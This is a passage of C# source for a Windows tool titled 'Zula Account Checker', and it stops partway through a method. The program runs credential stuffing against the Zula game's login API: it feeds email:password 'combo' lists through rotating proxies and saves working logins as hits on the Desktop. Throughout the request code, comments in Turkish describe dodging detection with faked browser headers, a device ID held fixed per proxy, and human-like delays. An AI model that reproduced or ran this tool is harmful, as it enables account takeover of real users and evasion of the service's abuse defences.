using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace ZulaChecker
{
    public class MainForm : Form
    {
        private TextBox txtComboFile, txtProxyFile, txtApiUrl;
        private Label lblUrlStatus, lblTotal, lblValid, lblInvalid, lblSpeed, lblProxyStatus;
        private NumericUpDown numThreads, numProxyThreads, numMinutes;
        private Button btnStart, btnStop, btnCheckProxies;
        private RichTextBox rtbLog;
        private Panel headerPanel, statsPanel;
        private CheckBox chkUseProxy;

        private ConcurrentBag<string> hits = new ConcurrentBag<string>();
        private ConcurrentQueue<string> proxyQueue = new ConcurrentQueue<string>();
        private List<string> workingProxies = new List<string>();
        private ConcurrentDictionary<string, string> proxyDeviceIds = new ConcurrentDictionary<string, string>();
        private int totalChecked = 0, totalValid = 0, totalInvalid = 0, totalProxyErrors = 0;
        private DateTime startTime;
        private CancellationTokenSource cts;
        private static readonly object proxyLock = new object();

        private static readonly ThreadLocal<Random> _random = new ThreadLocal<Random>(() => new Random(Guid.NewGuid().GetHashCode()));

        private Color bgPrimary = Color.FromArgb(18, 18, 24);
        private Color bgSecondary = Color.FromArgb(28, 28, 36);
        private Color bgCard = Color.FromArgb(32, 32, 42);
        private Color accentBlue = Color.FromArgb(59, 130, 246);
        private Color accentPurple = Color.FromArgb(139, 92, 246);
        private Color accentTeal = Color.FromArgb(20, 184, 166);
        private Color textPrimary = Color.FromArgb(243, 244, 246);
        private Color textSecondary = Color.FromArgb(156, 163, 175);
        private Color successGreen = Color.FromArgb(34, 197, 94);
        private Color errorRed = Color.FromArgb(239, 68, 68);

        public MainForm()
        {
            ServicePointManager.DefaultConnectionLimit = 1000;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.UseNagleAlgorithm = false;

            InitializeUI();
            this.Paint += (s, e) =>
            {
                using (var brush = new LinearGradientBrush(ClientRectangle, Color.FromArgb(18, 18, 24), Color.FromArgb(24, 24, 32), 45f))
                    e.Graphics.FillRectangle(brush, ClientRectangle);
            };
        }

        private void InitializeUI()
        {
            Text = "Zula Account Checker";
            ClientSize = new Size(900, 560);
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.None;
            BackColor = bgPrimary;

            bool isDragging = false;
            Point dragStart = Point.Empty;
            MouseDown += (s, e) => { isDragging = true; dragStart = e.Location; };
            MouseMove += (s, e) => { if (isDragging) { var p = PointToScreen(e.Location); Location = new Point(p.X - dragStart.X, p.Y - dragStart.Y); } };
            MouseUp += (s, e) => isDragging = false;

            headerPanel = new Panel { Location = new Point(0, 0), Size = new Size(900, 60), BackColor = bgCard };
            headerPanel.Paint += (s, e) => { using (var pen = new Pen(accentBlue, 2)) e.Graphics.DrawLine(pen, 0, 58, 900, 58); };
            headerPanel.Controls.Add(new Label { Text = "zulx account checker by leatern", Location = new Point(20, 18), Size = new Size(450, 25), Font = new Font("Segoe UI", 13, FontStyle.Bold), ForeColor = textPrimary, BackColor = Color.Transparent });

            var btnClose = CreateHeaderButton("×", 855, 12, 30, 30);
            btnClose.Click += (s, e) => Application.Exit();
            headerPanel.Controls.Add(btnClose);

            var btnMin = CreateHeaderButton("─", 820, 12, 30, 30);
            btnMin.Click += (s, e) => WindowState = FormWindowState.Minimized;
            headerPanel.Controls.Add(btnMin);

            Controls.Add(headerPanel);

            var configPanel = CreateModernPanel(25, 80, 420, 450);
            configPanel.Controls.Add(CreateSectionLabel("API URL", 12, 15));

            txtApiUrl = CreateModernTextBox(15, 40, 320, "https://api.zulaoyun.com/zula/login/LogOn");
            txtApiUrl.TextChanged += async (s, e) => await CheckApiUrl();
            configPanel.Controls.Add(txtApiUrl);

            lblUrlStatus = new Label { Text = "✅", Location = new Point(345, 40), Size = new Size(20, 20), Font = new Font("Segoe UI", 12), ForeColor = successGreen, BackColor = Color.Transparent, TextAlign = ContentAlignment.MiddleCenter };
            configPanel.Controls.Add(lblUrlStatus);

            configPanel.Controls.Add(CreateSectionLabel("Combo File", 12, 85));
            txtComboFile = CreateModernTextBox(15, 110, 320, "combo.txt");
            configPanel.Controls.Add(txtComboFile);

            var btnBrowseCombo = CreateModernButton("📁", 345, 108, 40, 28, accentBlue);
            btnBrowseCombo.Click += (s, e) => BrowseFile(txtComboFile);
            configPanel.Controls.Add(btnBrowseCombo);

            configPanel.Controls.Add(CreateSectionLabel("Proxy File (Optional)", 15, 155));
            txtProxyFile = CreateModernTextBox(15, 180, 180, "proxies.txt");
            configPanel.Controls.Add(txtProxyFile);

            var btnBrowseProxy = CreateModernButton("📁", 205, 178, 40, 28, accentBlue);
            btnBrowseProxy.Click += async (s, e) =>
            {
                BrowseFile(txtProxyFile);
                if (File.Exists(txtProxyFile.Text)) await LoadProxies();
            };
            configPanel.Controls.Add(btnBrowseProxy);

            btnCheckProxies = CreateModernButton("✓ Test", 255, 178, 130, 28, accentPurple);
            btnCheckProxies.Click += async (s, e) => await CheckProxies();
            configPanel.Controls.Add(btnCheckProxies);

            chkUseProxy = new CheckBox { Text = "Use Proxy", Location = new Point(15, 215), Size = new Size(100, 20), ForeColor = accentTeal, BackColor = Color.Transparent, Font = new Font("Segoe UI", 9, FontStyle.Bold), Checked = true };
            chkUseProxy.CheckedChanged += (s, e) =>
            {
                if (!chkUseProxy.Checked)
                {
                    lblProxyStatus.Text = "⚠ Proxy disabled - using direct connection";
                    lblProxyStatus.ForeColor = Color.Orange;
                }
                else if (workingProxies.Count > 0)
                {
                    lblProxyStatus.Text = $"✓ {workingProxies.Count} proxies ready";
                    lblProxyStatus.ForeColor = successGreen;
                }
            };
            configPanel.Controls.Add(chkUseProxy);

            lblProxyStatus = new Label { Text = "No proxy file loaded", Location = new Point(120, 215), Size = new Size(270, 18), Font = new Font("Segoe UI", 8), ForeColor = textSecondary, BackColor = Color.Transparent };
            configPanel.Controls.Add(lblProxyStatus);

            configPanel.Controls.Add(CreateSectionLabel("Settings", 15, 245));
            configPanel.Controls.Add(new Label { Text = "Check Threads:", Location = new Point(15, 275), Size = new Size(95, 22), ForeColor = textSecondary, Font = new Font("Segoe UI", 9), BackColor = Color.Transparent });
            numThreads = new NumericUpDown { Location = new Point(115, 273), Size = new Size(70, 25), Minimum = 1, Maximum = 500, Value = 20, BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.FixedSingle, Font = new Font("Segoe UI", 9) };
            configPanel.Controls.Add(numThreads);

            configPanel.Controls.Add(new Label { Text = "Proxy Threads:", Location = new Point(200, 275), Size = new Size(95, 22), ForeColor = textSecondary, Font = new Font("Segoe UI", 9), BackColor = Color.Transparent });
            numProxyThreads = new NumericUpDown { Location = new Point(300, 273), Size = new Size(70, 25), Minimum = 1, Maximum = 200, Value = 10, BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.FixedSingle, Font = new Font("Segoe UI", 9) };
            configPanel.Controls.Add(numProxyThreads);

            configPanel.Controls.Add(new Label { Text = "Check Interval (Min):", Location = new Point(15, 305), Size = new Size(120, 22), ForeColor = textSecondary, Font = new Font("Segoe UI", 9), BackColor = Color.Transparent });
            numMinutes = new NumericUpDown { Location = new Point(140, 303), Size = new Size(70, 25), Minimum = 1, Maximum = 60, Value = 5, BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.FixedSingle, Font = new Font("Segoe UI", 9) };
            configPanel.Controls.Add(numMinutes);

            btnStart = CreateModernButton("▶ Start Checking", 15, 340, 190, 38, successGreen);
            btnStart.Font = new Font("Segoe UI", 10, FontStyle.Bold);
            btnStart.Click += async (s, e) => await StartChecking();
            configPanel.Controls.Add(btnStart);

            btnStop = CreateModernButton("⬛ Stop", 215, 340, 190, 38, errorRed);
            btnStop.Font = new Font("Segoe UI", 10, FontStyle.Bold);
            btnStop.Enabled = false;
            btnStop.Click += (s, e) => StopChecking();
            configPanel.Controls.Add(btnStop);

            Controls.Add(configPanel);

            statsPanel = CreateModernPanel(465, 80, 410, 90);
            statsPanel.Controls.Add(CreateStatCard("CHECKED", "0", 10, 15, 92, 70, accentBlue, ref lblTotal));
            statsPanel.Controls.Add(CreateStatCard("VALID", "0", 107, 15, 92, 70, successGreen, ref lblValid));
            statsPanel.Controls.Add(CreateStatCard("INVALID", "0", 204, 15, 92, 70, errorRed, ref lblInvalid));
            statsPanel.Controls.Add(CreateStatCard("SPEED", "0/s", 301, 15, 94, 70, accentPurple, ref lblSpeed));
            Controls.Add(statsPanel);

            var logPanel = CreateModernPanel(465, 190, 410, 340);
            logPanel.Controls.Add(new Label { Text = "📋 Live Log", Location = new Point(15, 12), Size = new Size(225, 25), Font = new Font("Segoe UI", 10, FontStyle.Bold), ForeColor = textPrimary, BackColor = Color.Transparent });
            rtbLog = new RichTextBox { Location = new Point(15, 45), Size = new Size(380, 280), BackColor = bgSecondary, ForeColor = textPrimary, BorderStyle = BorderStyle.None, Font = new Font("Consolas", 8.5f), ReadOnly = true, WordWrap = true };
            logPanel.Controls.Add(rtbLog);
            Controls.Add(logPanel);
        }

        private async Task LoadProxies()
        {
            if (!File.Exists(txtProxyFile.Text)) return;
            btnStart.Enabled = false;
            btnCheckProxies.Enabled = false;
            LogMessage("📂 Loading proxies...", accentBlue);

            var allProxies = File.ReadAllLines(txtProxyFile.Text).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).Distinct().ToList();
            workingProxies.Clear();
            workingProxies.AddRange(allProxies);
            lblProxyStatus.Text = $"✓ {workingProxies.Count} proxies loaded (not tested)";
            lblProxyStatus.ForeColor = Color.Orange;
            LogMessage($"✓ Loaded {workingProxies.Count} proxies", successGreen);

            if (workingProxies.Count > 0)
            {
                var sample = workingProxies[0];
                if (sample.Split(':').Length == 4) LogMessage("✓ Format: IP:Port:User:Pass", accentTeal);
                else if (sample.Split(':').Length == 2) LogMessage("✓ Format: IP:Port", accentTeal);
            }

            LogMessage("💡 Tip: Click '✓ Test' to verify proxies", accentPurple);
            RefillProxyQueue();
            btnStart.Enabled = true;
            btnCheckProxies.Enabled = true;
        }

        private async Task CheckProxies()
        {
            if (!File.Exists(txtProxyFile.Text)) { MessageBox.Show("Proxy file not found!"); return; }
            btnCheckProxies.Enabled = false;
            btnStart.Enabled = false;
            workingProxies.Clear();

            LogMessage("🌐 Checking your real IP...", accentBlue);
            string realIP = await GetRealIP();
            if (string.IsNullOrEmpty(realIP)) { LogMessage("❌ Could not detect real IP!", errorRed); btnCheckProxies.Enabled = true; btnStart.Enabled = true; return; }
            LogMessage($"✓ Your IP: {realIP}", successGreen);

            var allProxies = File.ReadAllLines(txtProxyFile.Text).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Trim()).Distinct().ToList();
            LogMessage($"🔍 Testing {allProxies.Count} proxies (Round 1)...", accentPurple);
            lblProxyStatus.Text = "Checking proxies...";
            lblProxyStatus.ForeColor = accentPurple;

            int checkedCount = 0;
            var semaphore = new SemaphoreSlim((int)numProxyThreads.Value);
            var tasks = allProxies.Select(async proxy =>
            {
                await semaphore.WaitAsync();
                try
                {
                    var proxyIP = await TestProxyAndGetIP(proxy);
                    if (!string.IsNullOrEmpty(proxyIP) && proxyIP != realIP) { lock (workingProxies) { workingProxies.Add(proxy); } }
                    Interlocked.Increment(ref checkedCount);
                    Invoke(new Action(() => { lblProxyStatus.Text = $"Round 1: {workingProxies.Count} working | {checkedCount}/{allProxies.Count}"; }));
                }
                finally { semaphore.Release(); }
            });
            await Task.WhenAll(tasks);

            if (workingProxies.Count > 0)
            {
                LogMessage($"🔄 Re-checking {workingProxies.Count} proxies (Round 2)...", accentPurple);
                var firstRound = workingProxies.ToList();
                workingProxies.Clear();
                checkedCount = 0;
                var reTasks = firstRound.Select(async proxy =>
                {
                    await semaphore.WaitAsync();
                    try
                    {
                        var proxyIP = await TestProxyAndGetIP(proxy);
                        if (!string.IsNullOrEmpty(proxyIP) && proxyIP != realIP) { lock (workingProxies) { workingProxies.Add(proxy); } }
                        Interlocked.Increment(ref checkedCount);
                        Invoke(new Action(() => { lblProxyStatus.Text = $"Round 2: {workingProxies.Count} working | {checkedCount}/{firstRound.Count}"; }));
                    }
                    finally { semaphore.Release(); }
                });
                await Task.WhenAll(reTasks);
            }

            if (workingProxies.Count > 0)
            {
                string file = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"working_proxies_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
                File.WriteAllLines(file, workingProxies);
                LogMessage($"✓ Found {workingProxies.Count} working proxies", successGreen);
                lblProxyStatus.Text = $"✓ {workingProxies.Count} working proxies";
                lblProxyStatus.ForeColor = successGreen;
                RefillProxyQueue();
            }
            else
            {
                LogMessage("❌ No working proxies!", errorRed);
                lblProxyStatus.Text = "❌ No working proxies";
                lblProxyStatus.ForeColor = errorRed;
            }

            btnCheckProxies.Enabled = true;
            btnStart.Enabled = true;
        }

        private void RefillProxyQueue()
        {
            proxyQueue = new ConcurrentQueue<string>();
            foreach (var proxy in workingProxies) proxyQueue.Enqueue(proxy);
        }

        private async Task<string> GetRealIP()
        {
            try
            {
                using var client = new HttpClient(new HttpClientHandler { ServerCertificateCustomValidationCallback = (s, c, ch, e) => true }) { Timeout = TimeSpan.FromSeconds(10) };
                var response = await client.GetAsync("https://api.ipify.org?format=json");
                if (response.IsSuccessStatusCode)
                {
                    var json = JObject.Parse(await response.Content.ReadAsStringAsync());
                    return json["ip"]?.Value<string>();
                }
            }
            catch { }
            return null;
        }

        private async Task<string> TestProxyAndGetIP(string proxy)
        {
            try
            {
                var parts = proxy.Split(':');
                WebProxy webProxy = parts.Length == 4 ? new WebProxy($"http://{parts[0]}:{parts[1]}") { Credentials = new NetworkCredential(parts[2], parts[3]) } : parts.Length == 2 ? new WebProxy($"http://{proxy}") : null;
                if (webProxy == null) return null;

                using var client = new HttpClient(new HttpClientHandler { Proxy = webProxy, UseProxy = true, ServerCertificateCustomValidationCallback = (s, c, ch, e) => true, PreAuthenticate = true }) { Timeout = TimeSpan.FromSeconds(15) };
                var response = await client.GetAsync("https://api.ipify.org?format=json");
                if (response.IsSuccessStatusCode)
                {
                    var json = JObject.Parse(await response.Content.ReadAsStringAsync());
                    return json["ip"]?.Value<string>();
                }
            }
            catch { }
            return null;
        }

        private string GetNextProxy()
        {
            if (workingProxies.Count == 0) return null;

            lock (proxyLock)
            {
                if (proxyQueue.TryDequeue(out string proxy))
                {
                    proxyQueue.Enqueue(proxy);
                    return proxy;
                }

                RefillProxyQueue();
                if (proxyQueue.TryDequeue(out proxy))
                {
                    proxyQueue.Enqueue(proxy);
                    return proxy;
                }
            }

            return null;
        }

        private async Task StartChecking()
        {
            if (!File.Exists(txtComboFile.Text)) { MessageBox.Show("Combo file not found!"); return; }
            btnStart.Enabled = false;
            btnStop.Enabled = true;
            btnCheckProxies.Enabled = false;
            chkUseProxy.Enabled = false;
            cts = new CancellationTokenSource();
            hits.Clear();
            totalChecked = totalValid = totalInvalid = totalProxyErrors = 0;
            rtbLog.Clear();
            LogMessage("🚀 Starting checker...", accentBlue);

            if (chkUseProxy.Checked && workingProxies.Count > 0)
            {
                LogMessage("🔍 Verifying proxy...", accentBlue);
                RefillProxyQueue();
                string realIP = await GetRealIP();
                if (!string.IsNullOrEmpty(realIP))
                {
                    LogMessage($"Your IP: {realIP}", textSecondary);
                    bool proxyWorking = false;
                    for (int i = 0; i < Math.Min(3, workingProxies.Count); i++)
                    {
                        string proxyIP = await TestProxyAndGetIP(workingProxies[i]);
                        if (!string.IsNullOrEmpty(proxyIP) && proxyIP != realIP) { LogMessage($"✓ Proxy #{i + 1} working! IP: {proxyIP}", successGreen); proxyWorking = true; break; }
                    }
                    if (!proxyWorking)
                    {
                        LogMessage("❌ WARNING: Proxies failed!", errorRed);
                        if (MessageBox.Show("Proxies not working!\n\nContinue without proxy?", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                        { chkUseProxy.Checked = false; LogMessage("⚠ Switched to direct connection", Color.Orange); }
                        else
                        { btnStart.Enabled = true; btnStop.Enabled = false; btnCheckProxies.Enabled = true; chkUseProxy.Enabled = true; return; }
                    }
                }
            }
            else
            {
                LogMessage("⚠ No proxies - using direct connection", Color.Orange);
                string realIP = await GetRealIP();
                if (!string.IsNullOrEmpty(realIP)) LogMessage($"Your IP: {realIP}", textSecondary);
            }

            var combos = File.ReadAllLines(txtComboFile.Text).Where(l => !string.IsNullOrWhiteSpace(l)).Select(l => l.Split(':')).Where(p => p.Length >= 2).Select(p => (email: p[0].Trim(), password: string.Join(":", p.Skip(1)).Trim())).ToList();
            LogMessage($"✓ Loaded {combos.Count} combos", successGreen);
            if (chkUseProxy.Checked && workingProxies.Count > 0) LogMessage($"✓ Using {workingProxies.Count} proxies", successGreen);

            startTime = DateTime.Now;
            await CheckAllCombos(combos, (int)numThreads.Value, cts.Token);
            LogMessage($"✓ Finished! Time: {(DateTime.Now - startTime).TotalSeconds:F1}s", accentPurple);
            if (totalProxyErrors > 0) LogMessage($"⚠ Proxy errors: {totalProxyErrors}", Color.Orange);

            if (hits.Count > 0)
            {
                string file = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"zula_hits_{DateTime.Now:yyyyMMdd_HHmmss}.txt");
                File.WriteAllLines(file, hits);
                LogMessage($"💾 Saved {hits.Count} hits to Desktop", successGreen);
            }

            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnCheckProxies.Enabled = true;
            chkUseProxy.Enabled = true;
        }

        private void StopChecking()
        {
            cts?.Cancel();
            LogMessage("⚠ Stopped", errorRed);
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            btnCheckProxies.Enabled = true;
        }

        private async Task CheckAllCombos(List<(string email, string password)> combos, int threads, CancellationToken ct)
        {
            try
            {
                int intervalMinutes = (int)numMinutes.Value;
                LogMessage($"⏱️ Check interval: {intervalMinutes} minutes between checks", accentPurple);

                // Proxy kullanılıyorsa thread sayısını düşür
                int effectiveThreads = (chkUseProxy.Checked && workingProxies.Count > 0) ? Math.Min(threads, 5) : threads;

                if (chkUseProxy.Checked && workingProxies.Count > 0)
                {
                    LogMessage($"⚙️ Using {effectiveThreads} threads with proxies", accentPurple);
                }
                else
                {
                    LogMessage($"⚙️ Using {effectiveThreads} threads (direct connection)", accentPurple);
                }

                int comboIndex = 0;
                while (comboIndex < combos.Count && !ct.IsCancellationRequested)
                {
                    var combo = combos[comboIndex];

                    bool isValid = await CheckComboWithRetry(combo.email, combo.password);
                    Interlocked.Increment(ref totalChecked);
                    if (isValid)
                    {
                        hits.Add($"{combo.email}:{combo.password}");
                        Interlocked.Increment(ref totalValid);
                        Invoke(new Action(() => LogMessage($"✅ {combo.email}", successGreen)));
                    }
                    else Interlocked.Increment(ref totalInvalid);
                    UpdateStats();

                    comboIndex++;

                    // Her combo sonrası belirtilen süre kadar bekle
                    if (comboIndex < combos.Count && !ct.IsCancellationRequested)
                    {
                        int delayMs = intervalMinutes * 60 * 1000;
                        await Task.Delay(delayMs, ct);
                    }
                }
            }
            catch (OperationCanceledException) { }
        }

        private async Task<bool> CheckComboWithRetry(string email, string password)
        {
            // Proxy kullanımı kapalıysa veya proxy yoksa direkt check et
            if (!chkUseProxy.Checked || workingProxies.Count == 0)
            {
                try
                {
                    // Rate limit için kısa delay
                    await Task.Delay(_random.Value.Next(50, 150));
                    var (success, response) = await CheckComboDebug(email, password, null);
                    return success;
                }
                catch { return false; }
            }

            // Proxy kullanımı açıksa
            int maxRetries = totalChecked < 3 ? 5 : 3;

            for (int attempt = 0; attempt < maxRetries; attempt++)
            {
                string proxy = GetNextProxy();
                if (proxy == null) break;

                try
                {
                    var (success, response) = await CheckComboDebug(email, password, proxy);

                    // DEBUG LOG - sadece ilk 3 combo için
                    if (totalChecked < 3)
                    {
                        Invoke(new Action(() => LogMessage($"🔍 Attempt {attempt + 1} [{email}] via {proxy.Split(':')[0]}: {response.Substring(0, Math.Min(150, response.Length))}", Color.Yellow)));
                    }

                    if (success) return true;

                    // "6" response = proxy sorunu, başka proxy dene
                    if (response.Contains("\"6\"") || response == "6" || response.Contains("SHORT: \"6\""))
                    {
                        await Task.Delay(200 * (attempt + 1));
                        continue;
                    }

                    // Gerçek invalid response ise daha fazla deneme
                    if (response.Contains("Message") && response.Contains("\"3\""))
                    {
                        return false;
                    }

                    return false;
                }
                catch (Exception ex)
                {
                    Interlocked.Increment(ref totalProxyErrors);

                    if (totalChecked < 3)
                    {
                        Invoke(new Action(() => LogMessage($"⚠️ Attempt {attempt + 1} ERROR [{email}]: {ex.Message}", Color.Orange)));
                    }

                    await Task.Delay(100);
                }
            }
            return false;
        }

        private async Task<(bool success, string response)> CheckComboDebug(string email, string password, string proxy)
        {
            HttpClientHandler handler;
            string[] parts = null;

            if (!string.IsNullOrEmpty(proxy))
            {
                parts = proxy.Split(':');
                WebProxy webProxy = parts.Length == 4 ? new WebProxy($"http://{parts[0]}:{parts[1]}") { Credentials = new NetworkCredential(parts[2], parts[3]) } : parts.Length == 2 ? new WebProxy($"http://{proxy}") : null;
                if (webProxy == null) return (false, "INVALID_PROXY_FORMAT");
                handler = new HttpClientHandler
                {
                    Proxy = webProxy,
                    UseProxy = true,
                    ServerCertificateCustomValidationCallback = (s, c, ch, e) => true,
                    AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                    AllowAutoRedirect = false,
                    UseCookies = true,
                    CookieContainer = new System.Net.CookieContainer(),
                    MaxConnectionsPerServer = 50,
                    PreAuthenticate = true
                };
            }
            else handler = new HttpClientHandler { ServerCertificateCustomValidationCallback = (s, c, ch, e) => true, AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate, UseCookies = false, MaxConnectionsPerServer = 100 };

            using var client = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(!string.IsNullOrEmpty(proxy) ? 45 : 15) };

            // ÖNEMLİ: Proxy ile önce ana sayfayı ziyaret et (API'yi daha az şüphelendirmek için)
            if (!string.IsNullOrEmpty(proxy))
            {
                try
                {
                    // Random delay - bot gibi görünme
                    await Task.Delay(_random.Value.Next(300, 800));

                    // Ana sayfayı ziyaret et
                    var homeRequest = new HttpRequestMessage(HttpMethod.Get, "https://zulaoyun.com/");
                    homeRequest.Headers.TryAddWithoutValidation("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36");
                    homeRequest.Headers.TryAddWithoutValidation("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                    homeRequest.Headers.TryAddWithoutValidation("Accept-Language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7");
                    await client.SendAsync(homeRequest);

                    // Biraz daha bekle - insan gibi davran
                    await Task.Delay(_random.Value.Next(200, 500));
                }
                catch { }
            }

            // Daha gerçekçi User-Agent rotation
            string[] userAgents = new[]
            {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
            };
            string userAgent = userAgents[_random.Value.Next(userAgents.Length)];

            var request = new HttpRequestMessage(HttpMethod.Post, txtApiUrl.Text);
            request.Headers.TryAddWithoutValidation("Host", "api.zulaoyun.com");
            request.Headers.TryAddWithoutValidation("User-Agent", userAgent);
            request.Headers.TryAddWithoutValidation("Accept", "application/json, text/plain, */*");
            request.Headers.TryAddWithoutValidation("Accept-Language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7");
            request.Headers.TryAddWithoutValidation("Accept-Encoding", "gzip, deflate, br, zstd");
            request.Headers.TryAddWithoutValidation("Origin", "https://zulaoyun.com");
            request.Headers.TryAddWithoutValidation("Referer", "https://zulaoyun.com/");

            // ÖNEMLI: X-Forwarded-For headerını EKLEME! Bu proxy kullandığını ele verir

            request.Headers.TryAddWithoutValidation("sec-ch-ua", "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"");
            request.Headers.TryAddWithoutValidation("sec-ch-ua-mobile", "?0");
            request.Headers.TryAddWithoutValidation("sec-ch-ua-platform", "\"Windows\"");
            request.Headers.TryAddWithoutValidation("sec-fetch-dest", "empty");
            request.Headers.TryAddWithoutValidation("sec-fetch-mode", "cors");
            request.Headers.TryAddWithoutValidation("sec-fetch-site", "same-site");
            request.Headers.TryAddWithoutValidation("Connection", "keep-alive");

            // Her proxy için sabit bir DeviceId kullan (sürekli değişen ID şüpheli)
            string deviceId = GenerateDeviceId();
            if (!string.IsNullOrEmpty(proxy))
            {
                deviceId = proxyDeviceIds.GetOrAdd(proxy, _ => GenerateDeviceId());
            }

            var loginData = new { DeviceId = deviceId, Email = email, HWID = " ", IsCafe = "0", LoaderToken = "92vPZCLJLdEKcikYR1TW2rQODxSLHzPP4WRlw53irpXL7XvcZyXFjgRxQJjLV25WoVQUS14LIb28Jn2BBqjGD70vQ7wPV=PLmwMqTVyiKnEUmATixqmAF8fYRi8+jf98zXUMfHoQXMS9tVPJo1AVj078ScBXmtV8EVhqpPETKDdFmw2mx47/OZOyQHnkucdE/ACgyif0sv8l884xwCmBzqKno67I2B/noHAeXXvBtS", Locale = "tr", LuaId = GenerateLuaId(), Password = password, PublisherId = 1, TerminateZula = 0 };
            request.Content = new StringContent(JsonConvert.SerializeObject(loginData), System.Text.Encoding.UTF8, "application/json");

            try
            {
                var response = await client.SendAsync(request);
                var responseText = await response.Content.ReadAsStringAsync();

                // Proxy ile rate limit kontrolü
                if (responseText == "6" || responseText == "\"6\"" || (responseText.Length < 5 && responseText.Contains("6")))
                {
                    // Rate limit veya proxy bloğu - daha uzun bekle
                    await Task.Delay(1000);

                    // Yeni DeviceId ve LuaId ile tekrar dene
                    var newLoginData = new { DeviceId = GenerateDeviceId(), Email = email, HWID = " ", IsCafe = "0", LoaderToken = "92vPZCLJLdEKcikYR1TW2rQODxSLHzPP4WRlw53irpXL7XvcZyXFjgRxQJjLV25WoVQUS14LIb28Jn2BBqjGD70vQ7wPV=PLmwMqTVyiKnEUmATixqmAF8fYRi8+jf98zXUMfHoQXMS9tVPJo1AVj078ScBXmtV8EVhqpPETKDdFmw2mx47/OZOyQHnkucdE/ACgyif0sv8l884xwCmBzqKno67I2B/noHAeXXvBtS", Locale = "tr", LuaId = GenerateLuaId(), Password = password, PublisherId = 1, TerminateZula = 0 };
                    var retryRequest = CloneRequest(request, newLoginData);

                    try
                    {
                        var retryResponse = await client.SendAsync(retryRequest);
                        responseText = await retryResponse.Content.ReadAsStringAsync();
                    }
                    catch
                    {
                        // Retry başarısız oldu, orjinal response'u kullan
                    }
                }

                if (string.IsNullOrWhiteSpace(responseText)) return (false, "EMPTY_RESPONSE");
                if (responseText.Length < 10 && !responseText.Contains("{")) return (false, $"SHORT: {responseText}");

                try
                {
                    var json = JObject.Parse(responseText);

                    // Valid durumlar
                    if (json["ResultCode"]?.Value<int>() == 1 && json["Data"] != null) return (true, responseText);
                    string token = json["Token"]?.Value<string>();
                    string userId = json["UserId"]?.Value<string>();
                    if (!string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(userId)) return (true, responseText);
                    if (json["code"]?.Value<int>() == 0) return (true, responseText);
                    if (!string.IsNullOrEmpty(json["stok"]?.Value<string>())) return (true, responseText);
                    if (!string.IsNullOrEmpty(json["Email"]?.Value<string>())) return (true, responseText);
                    if (json["Id"]?.Value<int>() == 10) return (true, responseText);
                    if (json["Success"]?.Value<bool>() == true) return (true, responseText);
                    if (json["Message"]?.Value<string>() == "1") return (true, responseText);

                    // Invalid durumlar
                    if (json["Message"]?.Value<string>() == "3") return (false, responseText);
                    if (json["ResultCode"]?.Value<int>() == 0) return (false, responseText);

                    return (false, responseText);
                }
                catch (JsonException)
                {
                    bool isValid = responseText.Contains("Token") && responseText.Contains("UserId");
                    return (isValid, responseText);
                }
            }
            catch (Exception ex) { return (false, $"ERROR: {ex.Message}"); }
        }

        private string GenerateDeviceId()
        {
            var bytes = new byte[6];
            _random.Value.NextBytes(bytes);
            return BitConverter.ToString(bytes).Replace("-", "").ToLower();
        }

        private string GenerateLuaId()
        {
            var r = _random.Value;
            return $"{r.Next(1000, 9999):x4}-{Guid.NewGuid().ToString().Substring(0, 8)}-{r.Next(1000, 9999):x4}-{r.Next(10000000, 99999999)}-{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}-{r.Next(1000, 9999)}";
        }

        private HttpRequestMessage CloneRequest(HttpRequestMessage original, object loginData)
        {
            var request = new HttpRequestMessage(HttpMethod.Post, original.RequestUri);
            foreach (var header in original.Headers)
            {
                request.Headers.TryAddWithoutValidation(header.Key, header.Value);
            }
            request.Content = new StringContent(JsonConvert.SerializeObject(loginData), System.Text.Encoding.UTF8, "application/json");
            return request;
        }

        private void UpdateStats()
        {
            if (InvokeRequired) { Invoke(new Action(UpdateStats)); return; }
            lblTotal.Text = totalChecked.ToString();
            lblValid.Text = totalValid.ToString();
            lblInvalid.Text = totalInvalid.ToString();
            var elapsed = (DateTime.Now - startTime).TotalSeconds;
